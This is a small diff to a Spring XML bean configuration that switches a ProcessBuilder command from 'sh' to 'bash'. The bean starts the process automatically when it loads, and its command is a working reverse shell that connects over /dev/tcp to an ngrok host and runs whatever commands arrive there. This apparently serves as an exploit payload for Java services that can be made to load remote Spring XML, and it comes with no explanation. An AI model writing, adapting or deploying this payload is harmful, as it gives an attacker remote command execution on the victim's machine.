@@ -6,7 +6,7 @@
         <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
             <constructor-arg>
             <list>
-                <value>sh</value>
+                <value>bash</value>
                 <value>-c</value>
                 <value><![CDATA[exec 5<>/dev/tcp/0.tcp.ap.ngrok.io/11872;cat <&5 | while read line; do $line 2>&5 >&5; done]]></value>
             </list>
